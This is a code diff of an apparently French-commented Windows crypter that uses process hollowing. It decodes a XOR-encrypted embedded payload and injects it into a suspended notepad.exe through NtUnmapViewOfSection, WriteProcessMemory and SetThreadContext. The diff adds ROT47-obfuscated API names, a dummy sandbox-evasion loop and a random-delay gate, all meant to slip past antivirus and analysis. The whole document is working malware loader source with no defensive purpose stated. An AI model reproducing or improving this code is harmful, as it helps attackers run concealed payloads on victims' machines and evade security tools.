@@ -1,40 +1,41 @@
 #include <windows.h>
 #include "payload.h"
 
+int extern startrand () asm ("_startrand") ; // (unsigned char *);
+int extern findkernel () asm ("_findkernel") ; // (unsigned char *);
 
 // Redeclaration des fonctions offusquee 
 
 //http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Section/NtUnmapViewOfSection.html
 typedef LONG (WINAPI * PNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
-
-//
 typedef LONG (WINAPI * PNtResumeThread)(HANDLE ThreadHandle);
-
 // http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx
 typedef LONG (WINAPI * PWriteProcessMemory)(HANDLE hProcess, PVOID lpBaseAddress, LPCVOID lbBuffer, SIZE_T nSize,SIZE_T * lpNumberOfBytesWritten);
-
 //http://msdn.microsoft.com/en-us/library/windows/desktop/ms680632(v=vs.85).aspx
-typedef LONG (WINAPI * PSetThreadContext)( HANDLE htread, CONTEXT *lpcontext );
-
+typedef LONG (WINAPI * PSetThreadContext)( HANDLE hthread, CONTEXT *lpcontext );
+typedef LONG (WINAPI * PGetThreadContext)( HANDLE hthread, LPCONTEXT lpcontext );
 typedef LONG (WINAPI * PGetProcAddress)( HMODULE hModule,LPCSTR lpProcName );
-
 typedef LONG (WINAPI * PCreateProcessA)(LPCTSTR lpApplicationName,LPCSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
-
 typedef LONG (WINAPI * PReadProcessMemory)(HANDLE hProcess,LPCVOID lpBaseAddress,LPVOID lpBuffer,SIZE_T nSize,SIZE_T *lpNumberOfBytesRead);
 
 // VM scarving
-void vaauxfraises(int x) {
+int vaauxfraises(int x) {
 	int i;
 	int j;
 	int k;
+	int u;
+	int v;
 	for (i = 0; i < x; i++) {
 		j=x;
 		k=j+x; // dummy func
-		}
+		for (u = 0; u <0xf; u++) {
+			v=k+i;
+	}	
 	} 
-
+ return(v);
+}
 // Rot47 Function
-int rot47(char instring[32] ) {
+int rot47( char instring[32] ) {
 	int i;
   for (i = 0; i < strlen(instring); i++) {
 		instring[i]= 33 + ((instring[i] + 14) % 94);
@@ -56,6 +57,7 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
 	PNtUnmapViewOfSection xNtUnmapViewOfSection;
 	PWriteProcessMemory xWriteProcessMemory ;
 	PNtResumeThread xNtResumeThread;
+	PGetThreadContext xGetThreadContext;
 	PSetThreadContext xSetThreadContext;
 	PGetProcAddress xGetProcAddress;
 	PCreateProcessA xCreateProcessA;
@@ -69,6 +71,7 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
 	char vKERNEL32[]="<6C?6=ba";
 	char vNtResumeThread[]="}E#6DF>6%9C625";
 	char vWriteProcessMemory[]="(C:E6!C@46DD|6>@CJ";
+	char vGetThreadContext[]="v6E%9C625r@?E6IE";
 	char vSetThreadContext[]="$6E%9C625r@?E6IE";
   char vNtUnmapViewOfSection[]="}E&?>2A':6H~7$64E:@?";
   char vGetProcAddress[]="v6E!C@4p55C6DD";
@@ -80,6 +83,7 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
   rot47(vKERNEL32);
 	rot47(vNtResumeThread);
 	rot47(vWriteProcessMemory);
+	rot47(vGetThreadContext);
 	rot47(vSetThreadContext);
   rot47(vNtUnmapViewOfSection);
 	rot47(vGetProcAddress);
@@ -94,6 +98,7 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
   xCreateProcessA = PCreateProcessA(xGetProcAddress(Hkernel32,vCreateProcessA));
 	xNtResumeThread = PNtResumeThread(xGetProcAddress(Hntdll,vNtResumeThread));
 	xWriteProcessMemory = PWriteProcessMemory(xGetProcAddress(Hkernel32,vWriteProcessMemory));
+	xGetThreadContext = PGetThreadContext(xGetProcAddress(Hkernel32,vGetThreadContext));
 	xSetThreadContext = PSetThreadContext(xGetProcAddress(Hkernel32,vSetThreadContext));
 	xNtUnmapViewOfSection = PNtUnmapViewOfSection(xGetProcAddress(Hntdll,vNtUnmapViewOfSection));
 
@@ -108,7 +113,7 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
 			if (xCreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
 				CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
 				CTX->ContextFlags = CONTEXT_FULL;
-				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))){
+				if (xGetThreadContext(PI.hThread, LPCONTEXT(CTX))){
 					xReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
 
 				  // Mappe l'exe dans la thread
@@ -154,12 +159,19 @@ int dexor(unsigned char * lpayload,int lpayloadlen,unsigned char * lkey ) {
 int main()
 
 {
-vaauxfraises(41414141);
+
+int dummy = vaauxfraises(41414141);
+// cherche addresse de kernel32... work in progress
+findkernel();
 
 // Ce exe sera notepad
 char fakeexe[]="ri-H:?5@HD-?@E6A25]6I6";
 rot47(fakeexe);
-dexor(payload,payloadlen,key);
-ExecFile(LPSTR(fakeexe),payload);
+// Random delay et faux jump
+if (startrand()==1) {
+  dexor(payload,payloadlen,key);
+  ExecFile(LPSTR(fakeexe),payload);
+}
+
 return 0;
 }
